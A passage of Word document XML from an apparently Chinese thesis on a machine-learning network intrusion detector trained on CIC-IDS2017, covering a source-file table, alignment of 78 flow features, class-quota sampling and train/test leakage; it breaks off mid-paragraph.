            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>452</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="69D67422">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>78 维 CICFlowMeter 口径特征提取</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="266BE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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6358E63A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>center/inference.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F8EC5EB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>136</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="43B6062B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Detector：模型加载、批推理、Top-k 证据打包</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3845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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31B1B230">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>models/train.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1DF2031A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>591</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="51FA146A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>数据清洗、三档划分、五模型训练与选型</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="62E12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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="57CB31CB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>models/labels.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2D5EF074">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="60099010">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>标签归一化（含被写坏的 en dash）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="6AC95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381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="23D4A762">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>models/hybrid_forest.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="77FE2DE6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>306</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="69E79918">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第五个模型：Bagging 骨架 + 随机提升器</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0CCF439C">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6665EDEF">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.1 78 维特征的组织</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51063A55">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>78 维特征按 CICFlowMeter 的口径组织，分八组：基本量（流时长、前向/后向包数与字节数）、速率类（Flow Bytes/s、Flow Packets/s）、包长统计（均值、标准差、最大最小）、TCP 标志位计数、首部长度、活跃/空闲时间、子流统计、批量（bulk）统计。特征列名与顺序由 feature_schema.json 固定，训练与推理共用同一份 scaler 参数，保证两侧是同一把尺子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC5A544">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这一节最重要的工作不是写 78 个公式，而是把在线提取器的口径对齐到数据集。逐列核对时发现三处“列名一样、算法不一样”的地方，它们都不会报错，只会让线上向量悄悄落到训练分布之外。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C33CF7">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>还有一处分工是刻意的：协议类型不交给机器学习。TCP/UDP/ICMP 由 IP 首部的 protocol 字段直接确定，是确定性事实，用规则解析即可；机器学习只用在“载荷加密、规则难以穷尽”的统计行为层面，例如端口扫描、洪水攻击、暴力破解。78 维特征里也没有任何一维是“协议号”，因为一旦把它当特征，模型就可能学出“看到 UDP 就报 DDoS”这类与流量行为无关的捷径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078777DC">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-5　在线提取器与数据集的三处口径错配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8"/>
        <w:gridCol w:w="2041"/>
        <w:gridCol w:w="1928"/>
        <w:gridCol w:w="2041"/>
      </w:tblGrid>
      <w:tr w14:paraId="1067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8" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6F921180">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>特征列</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4FD3D326">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>数据集口径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1928" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1C3FC624">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>我们改前的口径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4A710612">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>判据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="450EB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64278990">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Packet Length 系列、Total Length of Fwd/Bwd Packets、Average Packet Size、Flow Bytes/s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5A92F8E4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>L4 载荷字节（不含 IP/TCP 首部）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1928" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2FC56F67">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>IP 总长度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="411EE348">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>数据集里单包流的这些列只取 0、2、6 三种值；改前一个 40 字节的纯 SYN 被记成 40</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="04C4B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8" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67A156CF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>八个 * Flag Count 与 Fwd/Bwd PSH/URG Flags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1897243C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0/1，表示该标志是否出现过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1928" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="29B07F02">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>出现次数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7BB50E6C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>全表 RST/ECE/CWE 恒为 0，PSH Flag Count 只有 {0,1}；改前 200 包洪流给出 Fwd PSH Flags=200，相对全表 z≈1006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="43612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608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1C5FD05D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>流的聚合形态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3AA2AA00">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>长流慢速（中位 84.9 s、6 个前向包）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1928" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0D7EAF67">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>短流突发（0.1 s、200 个前向包）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2041" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="034378C6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>不是 bug，是采集方式的差异；见下文</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7369081F">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EA1751A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>前两处已经按数据集口径改掉，并各留一条回归测试钉住：test_packet_length_columns_count_l4_payload_only 与 test_flag_columns_are_indicators_not_counts。第三处不是错误而是数据集的采集方式：CIC-IDS2017 里的“DoS Hulk”是一条跨 85 秒、6 个前向包的慢流，而我们现场构造的同名流量是 0.1 秒 200 个包的突发。按数据集形态手工造一条流（6 个前向小包 + 6 个后向 1656 字节包、跨 85 s、PSH 置位），其余各列都能对上，判定仍是 BENIGN 0.9999。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4A3603">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.2 数据准备与抽样口径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A318E29">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>使用 CIC-IDS2017 官方的 8 个 MachineLearningCVE CSV（2 830 743 行 × 79 列、844 MB），按类配额抽成六类小样本：BENIGN 116 860、DDoS 40 000、PortScan 32 655、DoS Hulk 30 394、Patator 9 150、Heartbleed 11，清洗后共 229 070 行 × 78 维（丢弃 297 行含缺失值或无穷值，去掉 24 479 行完全重复行）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB4979A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>之所以按类配额抽而不按比例抽，是因为全量里 BENIGN 占 80.3%、Heartbleed 只有 11 行。按比例抽到 25 万行，Heartbleed 只剩 1 行，7:2:1 划分后测试集 0 行，这个类等于被抹掉。代价必须写明：训练集的类别先验被人为抬高了（BENIGN 从 80.3% 降到 47.3%），所以本样本上的准确率不能当作线上准确率——真实部署里 80% 是正常流量，误报率的含义完全不同。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2CD709">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="3419475"/>
            <wp:effectExtent l="0" t="0" r="1460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420000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08926A61">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-2　小模型结构：（a）离线训练一次性产出模型文件；（b）在线推理复用训练期的 scaler 与特征口径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44598364">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.3 选型口径的三次修正</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2BF27D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第一次用分层随机划分，四个模型全部落在 0.999 附近，极差小于 0.001，名次由噪声决定。我们没有把这个数字当结论，而是去找它为什么这么高：CIC-IDS2017 的随机划分会把同一天的近似重复流同时分到训练集和测试集（抽样的 25 万行里 9.7% 是完全重复行，去重后仍剩大量只差几个字段的短流）。最直接的证据是 XGBoost 与一棵决策树只差 0.0002——如果 0.999 反映了模型对攻击行为的建模能力，多出来的 1 799 棵树不可能一点用都没有。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31535569">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
